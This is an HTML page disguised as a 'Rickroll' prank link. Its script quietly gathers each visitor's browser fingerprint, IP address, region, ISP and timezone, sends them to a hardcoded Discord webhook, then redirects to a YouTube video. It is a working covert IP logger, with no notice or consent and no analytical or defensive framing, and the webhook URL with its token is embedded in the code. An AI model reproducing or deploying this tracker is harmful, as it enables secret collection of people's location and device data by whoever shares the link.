<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Rickroll</title>
</head>
<body>

<h2>Loading...</h2>

<script>
const webhookURL = "https://discord.com/api/webhooks/1481002558695669912/3QmMwvISWqW74jd2PpzH9Bs-z8xKXPXr08op7tC5NejVe8wpJfxktaJKlHewoVU1b8J3";

// Get browser info
const browser = navigator.userAgent;
const platform = navigator.platform;
const language = navigator.language;

// Detect OS
let os = "Unknown";
if (platform.startsWith("Win")) os = "Windows";
else if (platform.startsWith("Mac")) os = "macOS";
else if (/iPhone|iPad|iPod/.test(platform)) os = "iOS";
else if (/Android/.test(platform)) os = "Android";
else if (/Linux/.test(platform)) os = "Linux";

// Detect device type
let deviceType = "Desktop";
if (/Mobi|Android|iPhone|iPad/.test(browser)) deviceType = "Mobile/Tablet";

// Screen info
const screenWidth = window.screen.width;
const screenHeight = window.screen.height;

// System fonts detection (basic)
const fonts = ["Arial","Verdana","Times New Roman","Courier New","Georgia"];
let availableFonts = [];
fonts.forEach(f => {
  const span = document.createElement("span");
  span.style.fontFamily = f;
  span.style.position = "absolute";
  span.style.visibility = "hidden";
  span.innerText = "abcdefg";
  document.body.appendChild(span);
  if (span.offsetWidth > 0) availableFonts.push(f);
  document.body.removeChild(span);
});

// Measure network latency (ping to example)
function measureLatency(url = "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png") {
  return new Promise((resolve) => {
    const start = performance.now();
    fetch(url, { method: "HEAD", cache: "no-cache" })
      .then(() => resolve(Math.round(performance.now() - start)))
      .catch(() => resolve("Unknown"));
  });
}

// Fetch IP and location info
fetch('https://ipapi.co/json/')
  .then(response => response.json())
  .then(async data => {
    const ip = data.ip || "Unknown";
    const region = data.region || data.city || "Unknown";
    const isp = data.org || "Unknown";
    const timezone = data.timezone || "Unknown";

    const latency = await measureLatency();

    // Prepare Discord webhook message
    const payload = {
      content: "**New Website Visitor**",
      embeds: [
        {
          title: "Visitor Info",
          color: 5763719,
          fields: [
            { name: "Browser (User Agent)", value: browser, inline: false },
            { name: "Operating System", value: os, inline: true },
            { name: "Device Type", value: deviceType, inline: true },
            { name: "Platform", value: platform, inline: true },
            { name: "Language", value: language, inline: true },
            { name: "Screen Size", value: `${screenWidth} x ${screenHeight}`, inline: true },
            { name: "System Fonts", value: availableFonts.join(", ") || "Unknown", inline: false },
            { name: "IP Address", value: ip, inline: true },
            { name: "Region", value: region, inline: true },
            { name: "ISP", value: isp, inline: true },
            { name: "Timezone", value: timezone, inline: true },
            { name: "Network Latency (ms)", value: latency.toString(), inline: true }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    };

    // Send data to Discord webhook
    fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    })
    .then(res => {
      if(res.ok) console.log("Webhook sent successfully");
      else console.error("Failed to send webhook");
    })
    .catch(console.error)
    .finally(() => {
      setTimeout(() => {
        window.location.href = "https://www.youtube.com/shorts/_6HzLIJPH2A?feature=share";
      }, 100);
    });
  })
  .catch(err => {
    console.error("Failed to fetch IP info", err);
    setTimeout(() => {
      window.location.href = "https://www.youtube.com/shorts/_6HzLIJPH2A?feature=share";
    }, 100);
  });
</script>

</body>
</html>
